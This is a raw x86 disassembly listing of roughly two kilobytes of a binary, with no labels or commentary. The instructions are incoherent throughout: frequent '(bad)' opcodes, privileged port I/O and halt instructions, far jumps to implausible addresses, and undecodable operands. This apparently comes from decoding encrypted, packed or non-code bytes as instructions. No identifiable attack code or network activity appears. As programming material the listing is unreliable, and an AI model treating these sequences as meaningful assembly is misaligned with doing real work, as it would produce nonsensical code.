  40d7e0:	and    DWORD PTR [eax-0x15f5d55c],ecx
  40d7e6:	stc    
  40d7e7:	mov    esi,0x84920752
  40d7ec:	pop    edx
  40d7ed:	lods   eax,DWORD PTR ds:[esi]
  40d7ee:	inc    esi
  40d7ef:	pushf  
  40d7f0:	or     BYTE PTR [esi-0x203426e4],cl
  40d7f6:	stc    
  40d7f7:	fwait
  40d7f8:	sti    
  40d7f9:	pop    ecx
  40d7fa:	ds jnp 0x40d796
  40d7fd:	in     eax,0xe5
  40d7ff:	jecxz  0x40d85d
  40d801:	pop    edx
  40d802:	test   eax,0xa355beb0
  40d807:	aas    
  40d808:	pushf  
  40d809:	and    al,0xe
  40d80b:	test   DWORD PTR [eax+0x4d2a26c],0x8240a7b
  40d815:	nop
  40d816:	xor    al,BYTE PTR [edx-0x6e]
  40d819:	and    BYTE PTR [edx-0x1c3176f8],dl
  40d81f:	xchg   ebx,eax
  40d820:	xchg   ecx,eax
  40d821:	not    bh
  40d823:	xor    BYTE PTR [eax],ch
  40d825:	jl     0x40d84a
  40d827:	pop    ebx
  40d828:	and    DWORD PTR [ebx],edx
  40d82a:	and    BYTE PTR [ebp+0x7],dl
  40d82d:	nop
  40d82e:	sbb    BYTE PTR [ebx-0x1c315b5f],ah
  40d834:	dec    edi
  40d835:	(bad)  
  40d836:	jl     0x40d834
  40d838:	scas   eax,DWORD PTR es:[edi]
  40d839:	(bad)  
  40d83a:	sub    bl,bh
  40d83c:	push   DWORD PTR [ecx+0x3f97f2d7]
  40d842:	hlt    
  40d843:	adc    BYTE PTR [ebp+0x572b874e],bl
  40d849:	scas   al,BYTE PTR es:[edi]
  40d84a:	fdivr  DWORD PTR [ecx]
  40d84c:	adc    dl,BYTE PTR [ebx+0x53]
  40d84f:	push   ebx
  40d850:	js     0x40d8d0
  40d852:	popf   
  40d853:	lahf   
  40d854:	sti    
  40d855:	(bad)  
  40d856:	lahf   
  40d857:	in     eax,0x8f
  40d859:	pop    ds
  40d85a:	cmp    DWORD PTR [edi-0x3e],ecx
  40d85d:	sub    al,0xd0
  40d85f:	inc    eax
  40d860:	stc    
  40d861:	cld    
  40d862:	sbb    eax,0x5412d18
  40d867:	jmp    0xcd862104
  40d86c:	adc    al,0x2c
  40d86e:	jecxz  0x40d843
  40d870:	sub    BYTE PTR [ecx+0x5b],cl
  40d873:	into   
  40d874:	and    cl,BYTE PTR gs:[ecx+0x3e305189]
  40d87b:	or     eax,edi
  40d87d:	test   DWORD PTR [edx+ebp*8+0x6f54bd79],edx
  40d884:	pop    es
  40d885:	and    esp,DWORD PTR [esp+0x32]
  40d889:	ret    
  40d88a:	adc    ah,dl
  40d88c:	scas   eax,DWORD PTR es:[edi]
  40d88d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d88e:	out    dx,eax
  40d88f:	xchg   ebp,eax
  40d890:	mov    eax,0xf810084c
  40d895:	and    ah,cl
  40d897:	mov    bh,0xc8
  40d899:	stos   DWORD PTR es:[edi],eax
  40d89a:	lods   al,BYTE PTR ds:[esi]
  40d89b:	rcr    BYTE PTR [esi+0x28917f6f],cl
  40d8a1:	ficom  WORD PTR [ebx]
  40d8a3:	jmp    0x40d914
  40d8a5:	xchg   esi,eax
  40d8a6:	sar    ebp,cl
  40d8a8:	shl    DWORD PTR [ebx+0x25d32094],cl
  40d8ae:	rcl    DWORD PTR [edx+0x7f25244],0x4
  40d8b5:	and    eax,0x9c53af41
  40d8ba:	stos   BYTE PTR es:[edi],al
  40d8bb:	cmp    eax,0x63733e3f
  40d8c0:	cmp    cl,ah
  40d8c2:	iret   
  40d8c3:	mov    esi,0xf686800a
  40d8c8:	out    0xa3,al
  40d8ca:	mov    ecx,0xee1316c6
  40d8cf:	jmp    0x40d90a
  40d8d1:	inc    esp
  40d8d2:	pushf  
  40d8d3:	dec    edx
  40d8d4:	je     0x40d869
  40d8d6:	adc    DWORD PTR [esi],0x2e00a8c8
  40d8dc:	dec    esp
  40d8dd:	jb     0x40d91a
  40d8df:	in     al,0x5a
  40d8e1:	mov    BYTE PTR [eax],al
  40d8e3:	jbe    0x40d90b
  40d8e5:	out    dx,al
  40d8e6:	cld    
  40d8e7:	jno    0x40d8e2
  40d8e9:	in     eax,dx
  40d8ea:	data16 lahf 
  40d8ec:	icebp  
  40d8ed:	jno    0x40d8fa
  40d8ef:	add    eax,0xd29e1069
  40d8f4:	dec    ebp
  40d8f5:	pop    ds
  40d8f6:	jg     0x40d8ec
  40d8f8:	push   ecx
  40d8f9:	xchg   esi,eax
  40d8fa:	imul   bh
  40d8fc:	out    0x7,eax
  40d8fe:	jle    0x40d8e0
  40d900:	pop    es
  40d901:	dec    ecx
  40d902:	xchg   edx,eax
  40d903:	cwde   
  40d904:	jle    0x40d8b5
  40d906:	(bad)  
  40d907:	jmp    0xf1b1883f
  40d90c:	loop   0x40d953
  40d90e:	(bad)  
  40d90f:	(bad)  
  40d910:	pop    edx
  40d911:	pop    esp
  40d912:	pop    esi
  40d913:	imul   esi,DWORD PTR [ebx-0x1a345184],0xcdf5922b
  40d91d:	test   ch,dh
  40d91f:	dec    ebp
  40d920:	dec    ecx
  40d921:	scas   eax,DWORD PTR es:[edi]
  40d922:	push   edi
  40d923:	add    dh,BYTE PTR [ecx]
  40d925:	push   es
  40d926:	mov    dl,0x81
  40d928:	xchg   esp,eax
  40d929:	arpl   WORD PTR [edx-0x30],bp
  40d92c:	adc    ebp,DWORD PTR [ebx]
  40d92e:	leave  
  40d92f:	and    al,0xe2
  40d931:	push   esp
  40d932:	xor    ah,dh
  40d934:	sub    esi,edx
  40d936:	pop    esi
  40d937:	retf   
  40d938:	retf   0xf5f8
  40d93b:	xor    al,0x73
  40d93d:	mov    edi,0xea3a5454
  40d942:	sbb    dh,0x66
  40d945:	cli    
  40d946:	xchg   ecx,eax
  40d947:	push   es
  40d948:	addr16 das 
  40d94a:	jp     0x40d948
  40d94c:	in     al,0xff
  40d94e:	cmc    
  40d94f:	sbb    al,0x9f
  40d951:	sti    
  40d952:	ret    0xde71
  40d955:	repz mov fs,WORD PTR [ebx]
  40d958:	sbb    al,0xb9
  40d95a:	jnp    0x40d98b
  40d95c:	xchg   ebp,eax
  40d95d:	retf   0x6b18
  40d960:	jmp    0x40d99f
  40d962:	sahf   
  40d963:	jns    0x40d953
  40d965:	and    eax,0x1dbfe8fe
  40d96a:	in     eax,0x89
  40d96c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d96d:	aaa    
  40d96e:	or     BYTE PTR [ebx+0x1bf92d69],dl
  40d974:	mov    ds,WORD PTR [edx-0x1f]
  40d977:	inc    edx
  40d978:	arpl   WORD PTR [edi-0x37f3ce10],ax
  40d97e:	rcr    edx,cl
  40d980:	push   ebx
  40d981:	jmp    0xd570:0x5a75884d
  40d988:	pushf  
  40d989:	and    al,0xa0
  40d98b:	out    0x5b,al
  40d98d:	sbb    ebp,DWORD PTR [eax-0x226aef9c]
  40d993:	outs   dx,DWORD PTR ds:[esi]
  40d994:	ins    BYTE PTR es:[edi],dx
  40d995:	add    ecx,esi
  40d997:	test   ebp,0xc7b0f8b8
  40d99d:	(bad)  
  40d99f:	and    DWORD PTR [edx],esp
  40d9a1:	retf   0x6e48
  40d9a4:	cmc    
  40d9a5:	jecxz  0x40d9c8
  40d9a7:	ins    BYTE PTR es:[edi],dx
  40d9a8:	retf   0x74ee
  40d9ab:	mov    ebx,0xd655c1d0
  40d9b0:	cmc    
  40d9b1:	call   0xdfb16daa
  40d9b6:	adc    ebp,eax
  40d9b8:	ror    BYTE PTR [esp+ebx*1+0x42],0x1c
  40d9bd:	dec    ebx
  40d9be:	mov    ds:0x52666630,al
  40d9c3:	loopne 0x40d9ce
  40d9c5:	adc    eax,0x433ea05b
  40d9ca:	push   esi
  40d9cb:	push   eax
  40d9cc:	cdq    
  40d9cd:	cli    
  40d9ce:	mov    ?,WORD PTR [ebx]
  40d9d0:	in     al,0x1
  40d9d2:	fsub   st,st(0)
  40d9d4:	iret   
  40d9d5:	xor    al,BYTE PTR [ebx]
  40d9d7:	jo     0x40d974
  40d9d9:	sub    cl,BYTE PTR [edi]
  40d9db:	retw   0xd381
  40d9df:	mov    ?,WORD PTR [edi-0x1d]
  40d9e2:	add    al,al
  40d9e4:	mov    al,ds:0xc3809485
  40d9e9:	xor    ah,al
  40d9eb:	idiv   ebp
  40d9ed:	imul   edi,DWORD PTR [edx+0x0],0xffffffcc
  40d9f1:	mul    BYTE PTR [edx]
  40d9f3:	js     0x40da54
  40d9f5:	les    edx,FWORD PTR [eax]
  40d9f7:	jbe    0x40d9cc
  40d9f9:	lods   al,BYTE PTR ds:[esi]
  40d9fa:	int    0x41
  40d9fc:	or     dl,bh
  40d9fe:	mov    ebp,0xe8941a9e
  40da03:	shl    BYTE PTR [eax-0x58],cl
  40da06:	enter  0xcbc0,0x17
  40da0a:	das    
  40da0b:	jb     0x40da06
  40da0d:	loop   0x40da54
  40da0f:	cmp    al,0xdf
  40da11:	(bad)  
  40da12:	idiv   DWORD PTR [edx+ebp*4]
  40da15:	mov    ch,0x1a
  40da17:	jae    0x40da0c
  40da19:	repz mov esp,0x3443c1e1
  40da1f:	call   0xb2e5:0x2af56a0d
  40da26:	(bad)  
  40da27:	and    BYTE PTR [ecx+0x6b],ah
  40da2a:	mov    ebx,0xbecfb3cd
  40da2f:	ror    cl,0x93
  40da32:	retf   
  40da33:	sub    al,0x2f
  40da35:	lahf   
  40da36:	out    0xe5,eax
  40da38:	adc    edx,DWORD PTR [edi+0x39]
  40da3b:	jnp    0x40d9de
  40da3d:	les    edx,FWORD PTR [esi-0x55]
  40da40:	inc    esi
  40da41:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40da42:	aas    
  40da43:	mov    DWORD PTR [ebx+esi*8-0x6d77d2f6],edx
  40da4a:	xchg   ebx,eax
  40da4b:	hlt    
  40da4c:	and    al,BYTE PTR [esi]
  40da4e:	sbb    DWORD PTR [ecx],edi
  40da50:	jg     0x40daac
  40da52:	bound  esp,QWORD PTR [edi-0x10ac86b1]
  40da58:	ss shr ah,cl
  40da5b:	sub    BYTE PTR [esi-0x52],dh
  40da5e:	addr16 aad 0x1
  40da61:	ret    
  40da62:	add    al,0xb4
  40da64:	das    
  40da65:	dec    esi
  40da66:	aam    0xe9
  40da68:	or     eax,0x727d1e03
  40da6d:	fwait
  40da6e:	addr16 (bad) 
  40da70:	ds ret 
  40da72:	js     0x40da67
  40da74:	dec    ecx
  40da75:	push   0x35
  40da77:	(bad)  
  40da78:	pop    esi
  40da79:	outs   dx,DWORD PTR ds:[esi]
  40da7a:	enter  0x76e6,0x48
  40da7e:	jg     0x40dad0
  40da80:	push   es
  40da81:	xor    DWORD PTR [edi-0x1d976368],esp
  40da87:	sbb    dl,BYTE PTR [ecx+esi*1]
  40da8a:	inc    esp
  40da8b:	in     al,0x64
  40da8d:	sub    BYTE PTR [edx-0xd5eff98],dh
  40da93:	dec    BYTE PTR [ecx-0x7f]
  40da96:	dec    esp
  40da97:	add    al,0x49
  40da99:	sub    al,0x90
  40da9b:	xor    esp,eax
  40da9d:	mov    DWORD PTR [edx+0x6860181d],ebx
  40daa3:	int3   
  40daa4:	xor    eax,0x99f679c6
  40daa9:	test   DWORD PTR [ecx],esp
  40daab:	inc    edx
  40daac:	addr16 lahf 
  40daae:	shl    ecx,1
  40dab0:	aad    0x3e
  40dab2:	xchg   ecx,eax
  40dab3:	(bad)  
  40dab5:	mov    ds:0xbf0b02d1,al
  40daba:	test   edx,edi
  40dabc:	test   BYTE PTR [ebx+edi*8+0x7c],0x76
  40dac1:	adc    esp,DWORD PTR [eax+0x63]
  40dac4:	adc    ah,dl
  40dac6:	(bad)  
  40dac7:	xchg   esp,eax
  40dac8:	mov    bh,0x15
  40daca:	mov    WORD PTR [edi],?
  40dacc:	mov    DWORD PTR [ebx],edi
  40dace:	sbb    edx,DWORD PTR [eax+0x32]
  40dad1:	sbb    al,0xf4
  40dad3:	mov    ecx,0xaa31aee7
  40dad8:	adc    eax,0x5464cd9f
  40dadd:	and    eax,0x1b374505
  40dae2:	sbb    ebx,DWORD PTR [ebx]
  40dae4:	xchg   esi,eax
  40dae5:	push   cs
  40dae6:	jb     0x40dad5
  40dae8:	adc    eax,0xdbc04d54
  40daed:	fisubr DWORD PTR [esi+0x32]
  40daf0:	and    edx,DWORD PTR [eax-0x47b4eccd]
  40daf6:	(bad)  
  40daf7:	or     al,0xe5
  40daf9:	shl    BYTE PTR [ecx+0x47172742],cl
  40daff:	in     eax,dx
  40db00:	dec    edx
  40db01:	cld    
  40db02:	popf   
  40db03:	and    al,0x3c
  40db05:	push   0x5cedee98
  40db0a:	push   esp
  40db0b:	sar    ebp,0xdb
  40db0e:	add    DWORD PTR [esi+0x15],ecx
  40db11:	dec    edx
  40db12:	jge    0x40dacf
  40db14:	dec    ebp
  40db15:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40db16:	push   ecx
  40db17:	sbb    BYTE PTR [esi+0x36],0x25
  40db1b:	mov    bl,0xd5
  40db1d:	jge    0x40dab2
  40db1f:	cmp    BYTE PTR [esi],ah
  40db21:	shl    DWORD PTR [ecx+0x1b1b9b02],1
  40db27:	retf   0xeb82
  40db2a:	sti    
  40db2b:	xchg   esp,eax
  40db2c:	stos   DWORD PTR es:[edi],eax
  40db2d:	push   ebp
  40db2e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40db2f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40db30:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40db31:	imul   esi,DWORD PTR [esi],0x4d4e4c9b
  40db37:	icebp  
  40db38:	sub    eax,0xef30f2df
  40db3d:	std    
  40db3e:	mov    dh,0xf7
  40db40:	adc    al,BYTE PTR [esi+0x21]
  40db43:	popf   
  40db44:	dec    esi
  40db45:	mov    edx,DWORD PTR [ebx-0x59]
  40db48:	pop    esi
  40db49:	data16 stc 
  40db4b:	int3   
  40db4c:	pop    ecx
  40db4d:	dec    esi
  40db4e:	sahf   
  40db4f:	cmp    cl,bh
  40db51:	ror    edi,cl
  40db53:	ds (bad) 
  40db55:	repnz (bad) [eax-0xa7aa953]
  40db5c:	in     eax,dx
  40db5d:	or     edx,esp
  40db5f:	push   0x20e3782f
  40db64:	jmp    0x40db90
  40db66:	add    bh,0x4f
  40db69:	mov    al,0x4c
  40db6b:	and    DWORD PTR [ecx],ebx
  40db6d:	add    BYTE PTR [ecx],dl
  40db6f:	and    al,0x11
  40db71:	push   ss
  40db72:	sub    eax,0xa6f5cc38
  40db77:	call   0x9a21:0x1779c385
  40db7e:	or     DWORD PTR [eax],edi
  40db80:	rcr    BYTE PTR [edx+0x54],cl
  40db83:	nop
  40db84:	jb     0x40db20
  40db86:	out    dx,al
  40db87:	mov    al,ds:0x53dfb749
  40db8c:	iret   
  40db8d:	inc    edx
  40db8e:	or     al,0x22
  40db90:	add    BYTE PTR [edi-0x560bf57c],bh
  40db96:	xchg   ebx,eax
  40db97:	sbb    eax,0xe8098632
  40db9c:	gs retf 
  40db9e:	add    al,0xcc
  40dba0:	(bad)  
  40dba1:	int3   
  40dba2:	jnp    0x40dc1c
  40dba4:	push   esi
  40dba5:	add    eax,0x8c811248
  40dbaa:	and    eax,0x85884889
  40dbaf:	xchg   edi,ebp
  40dbb1:	push   0x2a
  40dbb3:	add    ah,bh
  40dbb5:	cdq    
  40dbb6:	test   BYTE PTR [ebp+0x4f5cc2d0],dl
  40dbbc:	fistp  DWORD PTR [ebx-0x50]
  40dbbf:	test   al,0x20
  40dbc1:	mov    ebp,0xcf21a8d7
  40dbc6:	and    BYTE PTR [edx],cl
  40dbc8:	enter  0xc86,0x67
  40dbcc:	(bad)  
  40dbcd:	mov    edx,DWORD PTR [eax]
  40dbcf:	ret    0xf171
  40dbd2:	inc    ebp
  40dbd3:	neg    BYTE PTR [edx]
  40dbd5:	or     cl,BYTE PTR [eax+0x4e096de4]
  40dbdb:	xlat   BYTE PTR ds:[ebx]
  40dbdc:	mov    ds:0x8e915d6c,al
  40dbe1:	add    cl,BYTE PTR [edx+edx*4-0x78]
  40dbe5:	test   eax,0x8c664a89
  40dbea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dbeb:	lahf   
  40dbec:	and    DWORD PTR [ebx+0x37076c0a],ebx
  40dbf2:	loopne 0x40dbb9
  40dbf4:	(bad)  
  40dbf5:	jg     0x40dbf3
  40dbf7:	jecxz  0x40dbb0
  40dbf9:	rol    BYTE PTR [edx+0x54],cl
  40dbfc:	fsubr  DWORD PTR [esi+0x32]
  40dbff:	pop    ds
  40dc00:	and    bl,0x53
  40dc03:	iret   
  40dc04:	sbb    BYTE PTR [ebx],dh
  40dc06:	mov    dl,0x1f
  40dc08:	ret    0x1c35
  40dc0b:	call   0x495c:0xfdbbcf97
  40dc12:	lahf   
  40dc13:	dec    edi
  40dc14:	and    bl,BYTE PTR [edx-0xc]
  40dc17:	or     al,0x79
  40dc19:	retf   
  40dc1a:	stos   BYTE PTR es:[edi],al
  40dc1b:	stos   DWORD PTR es:[edi],eax
  40dc1c:	dec    edx
  40dc1d:	mov    eax,0xfe5be5c7
  40dc22:	xor    esp,0xffffffba
  40dc25:	pop    ebp
  40dc26:	pop    ebp
  40dc27:	jne    0x40dc8f
  40dc29:	je     0x40dc8a
  40dc2b:	pop    esi
  40dc2c:	in     eax,0xb0
  40dc2e:	(bad)  
  40dc2f:	fsub   QWORD PTR [ecx+eiz*2]
  40dc32:	shr    bh,1
  40dc34:	jae    0x40dc27
  40dc36:	cld    
  40dc37:	jns    0x40dc8e
  40dc39:	(bad)
  40dc3d:	xchg   ebp,eax
  40dc3e:	dec    edx
  40dc3f:	aam    0xea
  40dc41:	jne    0x40dc09
  40dc43:	daa    
  40dc44:	daa    
  40dc45:	cdq    
  40dc46:	sahf   
  40dc47:	sahf   
  40dc48:	data16 (bad) 
  40dc4a:	(bad)  
  40dc4b:	mov    ebx,0xdffbe6f9
  40dc50:	and    bh,0x9
  40dc53:	cmp    bl,ch
  40dc55:	imul   ebp,DWORD PTR ss:[ebx-0x69],0xffffffb9
  40dc5a:	js     0x40dc3d
  40dc5c:	add    ch,BYTE PTR [edi]
  40dc5e:	mov    edi,0xcf33ccb2
  40dc63:	sahf   
  40dc64:	in     al,0xe4
  40dc66:	jmp    0x662c47a1
  40dc6b:	ss mov dh,0xa7
  40dc6e:	fldcw  WORD PTR [edi+ecx*2+0x20]
  40dc72:	pop    es
  40dc73:	gs nop
  40dc75:	adc    eax,0xabc03528
  40dc7a:	sub    BYTE PTR [edi],0x40
  40dc7d:	or     al,0x41
  40dc7f:	xchg   BYTE PTR [eax-0x58],al
  40dc82:	sbb    BYTE PTR [ebx+0x755498c],al
  40dc88:	lods   eax,DWORD PTR ds:[esi]
  40dc89:	retf   
  40dc8a:	out    dx,eax
  40dc8b:	xchg   BYTE PTR [ecx],bh
  40dc8d:	pop    eax
  40dc8e:	out    dx,eax
  40dc8f:	xor    BYTE PTR [ebx-0x76],0x9d
  40dc93:	inc    ebp
  40dc94:	test   al,0xf5
  40dc96:	ins    DWORD PTR es:[edi],dx
  40dc97:	test   BYTE PTR [edx+0x2a],al
  40dc9a:	add    al,0x28
  40dc9c:	xlat   BYTE PTR ds:[ebx]
  40dc9d:	sahf   
  40dc9e:	imul   edx,eax,0xb
  40dca1:	aam    0x1f
  40dca3:	mov    cs,WORD PTR [edx]
  40dca5:	popa   
  40dca6:	outs   dx,DWORD PTR ds:[esi]
  40dca7:	popf   
  40dca8:	ret    0xa47c
  40dcab:	mov    dh,0x1
  40dcad:	in     al,0x1e
  40dcaf:	leave  
  40dcb0:	adc    bh,BYTE PTR [edi+0x4812344c]
  40dcb6:	dec    eax
  40dcb7:	jl     0x40dc3a
  40dcb9:	mov    ch,dl
  40dcbb:	xor    edi,DWORD PTR [eax+0x76]
  40dcbe:	test   DWORD PTR cs:[ecx-0x57e729a2],edi
  40dcc5:	inc    edi
  40dcc6:	or     BYTE PTR [esi],ch
  40dcc8:	mov    bl,0xb1
  40dcca:	scas   al,BYTE PTR es:[edi]
  40dccb:	ret    
  40dccc:	dec    esp
  40dccd:	add    al,0x66
  40dccf:	cs mov dh,0x5f
  40dcd2:	mov    edx,0x9ae7406e
  40dcd7:	cdq    
  40dcd8:	outs   dx,BYTE PTR ds:[esi]
  40dcd9:	retf   
  40dcda:	mov    ds,WORD PTR [ebx]
  40dcdc:	xor    DWORD PTR [eax-0x6],0x62e32776
  40dce3:	sbb    bh,BYTE PTR [ebp+0x2303a669]
  40dce9:	pop    es
  40dcea:	aam    0xaa
  40dcec:	push   ds
  40dced:	ret    
  40dcee:	popa   
  40dcef:	pop    eax
  40dcf0:	cmp    BYTE PTR [esi-0xd],cl
  40dcf3:	jae    0x40dd51
  40dcf5:	or     bl,dl
  40dcf7:	ins    DWORD PTR es:[edi],dx
  40dcf8:	lsl    eax,WORD PTR [esi-0x56ffbb65]
  40dcff:	mov    ebx,0x47310b2f
  40dd04:	ins    DWORD PTR es:[edi],dx
  40dd05:	add    BYTE PTR [esi-0x3e],ch
  40dd08:	nop
  40dd09:	lods   al,BYTE PTR ds:[esi]
  40dd0a:	push   ds
  40dd0b:	call   0x5213df42
  40dd10:	jns    0x40dce7
  40dd12:	and    BYTE PTR [edi],ch
  40dd14:	in     eax,0x8b
  40dd16:	mov    WORD PTR [edi+0x46],?
  40dd19:	lahf   
  40dd1a:	retf   0xf470
  40dd1d:	pushf  
  40dd1e:	ficom  DWORD PTR [eax-0x14af0181]
  40dd24:	popa   
  40dd25:	imul   esp,DWORD PTR [ecx],0x797e1b93
  40dd2b:	in     eax,dx
  40dd2c:	jmp    0x1125e627
  40dd31:	aas    
  40dd32:	push   es
  40dd33:	andnps xmm4,xmm3
  40dd36:	jge    0x40ddab
  40dd38:	jae    0x40dccd
  40dd3a:	jae    0x40dce3
  40dd3c:	dec    edi
  40dd3d:	repz inc edx
  40dd3f:	mov    ecx,0xa254a94c
  40dd44:	push   edx
  40dd45:	lods   eax,DWORD PTR ds:[esi]
  40dd46:	xor    bh,BYTE PTR [esi]
  40dd48:	ds dec esi
  40dd4a:	lods   eax,DWORD PTR ds:[esi]
  40dd4b:	pop    esi
  40dd4c:	addr16 jb 0x40ddc1
  40dd4f:	xor    DWORD PTR [edi-0x42],0x7bef30e3
  40dd56:	(bad)  
  40dd58:	lock cmp eax,0x65d870c9
  40dd5e:	jne    0x40dd0d
  40dd60:	(bad)
  40dd63:	sub    eax,0x9cfa3636
  40dd68:	ds mov ebx,0xbccfd3c9
  40dd6e:	ret    0xbb9
  40dd71:	pop    ebx
  40dd72:	ins    BYTE PTR es:[edi],dx
  40dd73:	mov    bh,0x7c
  40dd75:	scas   al,BYTE PTR es:[edi]
  40dd76:	outs   dx,BYTE PTR ds:[esi]
  40dd77:	dec    esp
  40dd78:	and    bl,al
  40dd7a:	sbb    eax,esi
  40dd7c:	sbb    esp,DWORD PTR [eax]
  40dd7e:	es and al,dh
  40dd81:	ror    DWORD PTR [ebx+0x208fac35],0xd1
  40dd88:	or     al,0x22
  40dd8a:	sbb    DWORD PTR [edx],ebp
  40dd8c:	mov    ds:0x22ffb133,al
  40dd91:	sti    
  40dd92:	cmp    eax,0x4dc92d32
  40dd97:	pop    ss
  40dd98:	ss dec esp
  40dd9a:	shr    dl,0xed
  40dd9d:	scas   al,BYTE PTR es:[edi]
  40dd9e:	mov    ah,0xb
  40dda0:	mov    dl,0xb0
  40dda2:	xlat   BYTE PTR ds:[ebx]
  40dda3:	xor    cl,BYTE PTR [esi-0xb4342dc]
  40dda9:	sub    al,0x4d
  40ddab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ddac:	fiadd  WORD PTR ds:0x84568157
  40ddb2:	and    BYTE PTR fs:[esi-0x5656648e],bh
  40ddb9:	mov    bl,0x71
  40ddbb:	adc    ah,bl
  40ddbd:	lds    ebp,FWORD PTR [eax]
  40ddbf:	add    dh,ch
  40ddc1:	dec    ebp
  40ddc2:	adc    DWORD PTR ds:0xee9db78b,0xadb5e996
  40ddcc:	jge    0x40dd8e
  40ddce:	fcomp  QWORD PTR [edi-0x71]
  40ddd1:	adc    eax,0xb420c452
  40ddd6:	stc    
  40ddd7:	xor    eax,0x82a7afaf
  40dddc:	dec    ecx
  40dddd:	ja     0x40dd64
  40dddf:	mov    ecx,0x7333ed9e
  40dde4:	cwde   
  40dde5:	xor    al,0x47
  40dde7:	addr16 lahf 
  40dde9:	lds    ebp,FWORD PTR [edx+edi*1+0x53359aaa]
  40ddf0:	and    al,0x10
  40ddf2:	inc    esi
  40ddf3:	push   eax
  40ddf4:	scas   eax,DWORD PTR es:[edi]
  40ddf5:	dec    ecx
  40ddf6:	out    dx,al
  40ddf7:	cmp    dl,ah
  40ddf9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ddfa:	fild   QWORD PTR [edi]
  40ddfc:	scas   al,BYTE PTR es:[edi]
  40ddfd:	add    eax,0x35f7c660
  40de02:	bound  eax,QWORD PTR [eax]
  40de04:	dec    esi
  40de05:	mov    ds,WORD PTR [esp+esi*2-0x19b225e5]
  40de0c:	add    al,0x34
  40de0e:	mov    edx,0x2af981bd
  40de13:	inc    ebp
  40de14:	xchg   ebp,eax
  40de15:	mov    dl,0x1
  40de17:	mov    BYTE PTR ds:0x613949ce,bl
  40de1d:	push   ds
  40de1e:	and    bl,BYTE PTR [ecx-0xd0f451a]
  40de24:	inc    esp
  40de25:	popf   
  40de26:	xlat   BYTE PTR ds:[ebx]
  40de27:	test   eax,0xc8aab0f2
  40de2c:	push   eax
  40de2d:	push   0x431188d4
  40de32:	int3   
  40de33:	pusha  
  40de34:	loopne 0x40de7e
  40de36:	xchg   BYTE PTR [ebx],bl
  40de38:	outs   dx,DWORD PTR ds:[esi]
  40de39:	add    cl,BYTE PTR [eax-0x2d0a671e]
  40de3f:	adc    eax,0xc42207ca
  40de44:	xor    BYTE PTR [eax],ah
  40de46:	mov    ecx,0x1a954d3a
  40de4b:	sahf   
  40de4c:	outs   dx,DWORD PTR ds:[esi]
  40de4d:	(bad)  
  40de4e:	xlat   BYTE PTR ds:[ebx]
  40de4f:	adc    eax,DWORD PTR [esi-0x50b0fcc6]
  40de55:	fisttp DWORD PTR [ebp-0x4d]
  40de58:	or     eax,0x9972a501
  40de5d:	push   edx
  40de5e:	adc    al,dl
  40de60:	sbb    al,0x1b
  40de62:	arpl   WORD PTR [esi+0x76],sp
  40de65:	xchg   esi,eax
  40de66:	pop    es
  40de67:	pop    esi
  40de68:	mov    bh,0x8f
  40de6a:	icebp  
  40de6b:	mov    DWORD PTR [ecx-0x16],esi
  40de6e:	mov    ch,0xa
  40de70:	and    DWORD PTR [ecx-0x61],0x4e
  40de74:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40de75:	lds    ebx,FWORD PTR [ecx-0x2c334cd]
  40de7b:	hlt    
  40de7c:	jno    0x40dedc
  40de7e:	jl     0x40de71
  40de80:	add    ch,BYTE PTR [edi]
  40de82:	popf   
  40de83:	fsub   st,st(6)
  40de85:	in     al,dx
  40de86:	add    eax,0x126d5958
  40de8b:	jbe    0x40de33
  40de8d:	rcr    DWORD PTR [edi+0x2fcc082],0x48
  40de94:	dec    eax
  40de95:	jp     0x40deb7
  40de97:	pop    es
  40de98:	adc    BYTE PTR [edi],cl
  40de9a:	aam    0xb2
  40de9c:	push   ebp
  40de9d:	and    DWORD PTR [eax+ebx*8-0x55],ebx
  40dea1:	jg     0x40de2e
  40dea3:	and    al,BYTE PTR [esi]
  40dea5:	lea    edx,[edi-0x40]
  40dea8:	xor    dl,BYTE PTR [ecx+0x30cf0754]
  40deae:	adc    ebp,DWORD PTR [ecx+0x18e78791]
  40deb4:	adc    eax,0x5f404c33
  40deb9:	or     esp,DWORD PTR [ecx-0x2322a44a]
  40debf:	mov    al,ds:0x13df052c
  40dec4:	cmp    eax,0x44f13fff
  40dec9:	push   0xffffffd0
  40decb:	jae    0x40dee0
  40decd:	js     0x40df35
  40decf:	adc    BYTE PTR [ebx+edi*2-0xe608b23],ah
  40ded6:	sbb    ah,BYTE PTR [esp+ecx*1+0x80aa721]
  40dedd:	xchg   DWORD PTR [eax+0x592efba5],ecx
  40dee3:	out    0x20,al
  40dee5:	xor    edx,edx
  40dee7:	(bad)  
  40dee9:	inc    edx
  40deea:	iret   
  40deeb:	xor    ecx,eax
  40deed:	xor    DWORD PTR [ebx-0x5be7f66c],esp
  40def3:	mov    ds:0x289c5a18,al
  40def8:	pop    ss
  40def9:	loopne 0x40df4f
  40defb:	push   ebx
  40defc:	mov    dl,0x6f
  40defe:	outs   dx,DWORD PTR ds:[esi]
  40deff:	xchg   ebx,eax
  40df00:	xor    dl,ch
  40df02:	out    dx,al
  40df03:	mov    BYTE PTR [eax],ch
  40df05:	dec    ebp
  40df06:	push   es
  40df07:	stos   BYTE PTR es:[edi],al
  40df08:	cld    
  40df09:	std    
  40df0a:	je     0x40df47
  40df0c:	ret    
  40df0d:	stos   DWORD PTR es:[edi],eax
  40df0e:	shr    BYTE PTR [esi-0x26],1
  40df11:	or     BYTE PTR [eax+0x5b36ffa6],bl
  40df17:	pop    ebp
  40df18:	inc    edx
  40df19:	iret   
  40df1a:	dec    edx
  40df1b:	pop    edi
  40df1c:	jecxz  0x40df2d
  40df1e:	ja     0x40dea9
  40df20:	mov    bh,0x8
  40df22:	add    eax,0xef9b04b8
  40df27:	les    edi,FWORD PTR [edx+edi*2-0x46738bb0]
  40df2e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
